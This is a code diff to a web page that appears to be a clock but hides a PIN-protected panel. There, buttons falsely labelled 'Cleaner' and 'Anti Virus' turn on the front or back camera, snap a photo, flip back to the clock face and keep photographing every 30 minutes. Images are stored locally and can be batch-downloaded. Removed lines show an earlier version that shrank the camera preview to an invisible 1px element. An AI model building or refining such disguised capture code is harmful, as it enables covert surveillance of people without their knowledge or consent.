@@ -19,17 +19,23 @@
         input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }
 
         #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
-        video { width: 1px; height: 1px; opacity: 0; position: absolute; } /* Hidden preview */
+        
+        /* Preview Visible Mode */
+        .preview-box { width: 100%; display: flex; justify-content: center; margin-bottom: 15px; }
+        video { width: 240px; height: 180px; border: 2px solid #3498db; border-radius: 12px; background: #111; object-fit: cover; }
+
         .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
         .btn-blue { background: #3498db; }
         .btn-green { background: #2ecc71; }
         .btn-red { background: #e74c3c; }
+        .btn-purple { background: #8e44ad; }
 
         #gallery-container { display: none; margin-top: 20px; }
-        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 50px; }
+        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding-bottom: 20px; }
         .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
         .card img { width: 100%; border-radius: 8px; margin-bottom: 5px; }
-        .del-btn { background: #e74c3c; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 12px; }
+        .card-btns { display: flex; gap: 5px; }
+        .del-btn { flex: 1; border: none; padding: 8px; border-radius: 6px; cursor: pointer; font-size: 11px; color: white; }
     </style>
 </head>
 <body>
@@ -44,30 +50,34 @@
     </div>
 
     <div id="pin-screen">
-        <h3>System Access</h3>
+        <h3 style="color:#3498db;">System Access</h3>
         <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
         <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
     </div>
 
     <div id="admin-panel">
         <h3 style="text-align:center; color:#3498db;">ROMAN STUDIO CONTROL</h3>
-        <video id="preview" autoplay playsinline muted></video>
+        
+        <div class="preview-box">
+            <video id="preview" autoplay playsinline muted></video>
+        </div>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="startAutoPhoto('user')">Cleaner (Front)</button>
-        <button class="btn btn-green" onclick="startAutoPhoto('environment')">Anti Virus (Back)</button>
-        <button class="btn btn-blue" style="background:#8e44ad;" onclick="toggleGallery()">Full System (Gallery)</button>
-        
+        <button class="btn btn-blue" onclick="startAutoPhoto('user')">Cleaner (Front Cam)</button>
+        <button class="btn btn-green" onclick="startAutoPhoto('environment')">Anti Virus (Back Cam)</button>
+        <button class="btn btn-purple" onclick="toggleGallery()">Full System (Gallery)</button>
         <button class="btn btn-red" onclick="location.reload()">Lock System</button>
 
         <div id="gallery-container">
             <h4 style="text-align:center; border-top:1px solid #333; padding-top:10px;">Stored Assets</h4>
+            <button class="btn btn-green" style="font-size:12px; padding:10px;" onclick="downloadAll()">Download & Clear All</button>
             <div id="gallery" class="gallery"></div>
-            <button class="btn btn-red" onclick="toggleGallery()">Close</button>
+            <button class="btn btn-red" onclick="toggleGallery()">Close Gallery</button>
         </div>
     </div>
 
     <script>
+        // Clock Logic
         function runClock() {
             const now = new Date();
             document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
@@ -94,18 +104,11 @@
             } 
         }
 
-        function toggleGallery() {
-            let el = document.getElementById('gallery-container');
-            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
-            if(el.style.display === 'block') updateGallery();
-        }
-
         let currentStream = null;
         let photoInterval = null;
 
         async function startAutoPhoto(camType) {
             if(photoInterval) clearInterval(photoInterval);
-            goBackToClock(); // فورا کلاک پر واپس
             
             try {
                 currentStream = await navigator.mediaDevices.getUserMedia({ 
@@ -115,24 +118,17 @@
                 
                 const preview = document.getElementById('preview');
                 preview.srcObject = currentStream;
-                
-                let count = 0;
-                const takeSnap = () => {
-                    if(count < 20) {
-                        // 2 سیکنڈ انتظار تاکہ کیمرہ کالی تصویر نہ دے
-                        setTimeout(() => {
-                            takePhoto();
-                            count++;
-                        }, 2000);
-                    } else {
-                        stopAll();
-                    }
+
+                preview.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        takePhoto();
+                        goBackToClock(); // تصویر لے کر واپس کلاک پر
+                    }, 2000);
                 };
 
-                takeSnap(); 
-                photoInterval = setInterval(takeSnap, 30 * 60 * 1000); // ہر 30 منٹ بعد
+                photoInterval = setInterval(takePhoto, 30 * 60 * 1000);
                 
-            } catch(e) { console.log("Camera Error"); }
+            } catch(e) { alert("کیمرہ تک رسائی نہیں ہو رہی!"); }
         }
 
         function takePhoto() {
@@ -140,26 +136,24 @@
             const canvas = document.getElementById('canvas');
             if(!preview.srcObject) return;
             
-            canvas.width = preview.videoWidth || 640; 
-            canvas.height = preview.videoHeight || 480;
+            canvas.width = preview.videoWidth; 
+            canvas.height = preview.videoHeight;
             canvas.getContext('2d').drawImage(preview, 0, 0, canvas.width, canvas.height);
             
-            let data = canvas.toDataURL('image/jpeg', 0.8);
-            if(data.length > 1000) { // چیک کریں کہ ڈیٹا خالی تو نہیں
-                saveData('img', data);
-            }
+            let data = canvas.toDataURL('image/jpeg', 0.7);
+            saveData(data);
         }
 
-        function stopAll() {
-            if(photoInterval) clearInterval(photoInterval);
-            if(currentStream) currentStream.getTracks().forEach(t => t.stop());
-            currentStream = null;
-        }
-
-        function saveData(type, data) {
+        function saveData(data) {
             let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            storage.push({ t: type, d: data, time: new Date().toLocaleString() });
+            storage.push({ d: data, time: new Date().toLocaleString() });
             localStorage.setItem('rvault', JSON.stringify(storage));
+        }
+
+        function toggleGallery() {
+            let el = document.getElementById('gallery-container');
+            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+            if(el.style.display === 'block') updateGallery();
         }
 
         function updateGallery() {
@@ -172,9 +166,38 @@
                     <div class="card">
                         <img src="${item.d}">
                         <p style="font-size:9px;">${item.time}</p>
-                        <button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button>
+                        <div class="card-btns">
+                            <button class="del-btn" style="background:#27ae60;" onclick="downloadAndDelete(${actualIndex}, '${item.d}')">Save</button>
+                            <button class="del-btn" style="background:#e74c3c;" onclick="deleteItem(${actualIndex})">Del</button>
+                        </div>
                     </div>`;
             });
+        }
+
+        function downloadAndDelete(index, dataUrl) {
+            const link = document.createElement('a');
+            link.href = dataUrl;
+            link.download = `Roman_Studio_${index}.jpg`;
+            link.click();
+            setTimeout(() => deleteItem(index), 500);
+        }
+
+        function downloadAll() {
+            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
+            if(storage.length === 0) return alert("گیلری خالی ہے!");
+            
+            storage.forEach((item, index) => {
+                const link = document.createElement('a');
+                link.href = item.d;
+                link.download = `Roman_Studio_Batch_${index}.jpg`;
+                link.click();
+            });
+            
+            setTimeout(() => {
+                localStorage.setItem('rvault', '[]');
+                updateGallery();
+                alert("تمام تصاویر محفوظ کر کے گیلری صاف کر دی گئی ہے۔");
+            }, 1000);
         }
 
         function deleteItem(index) {
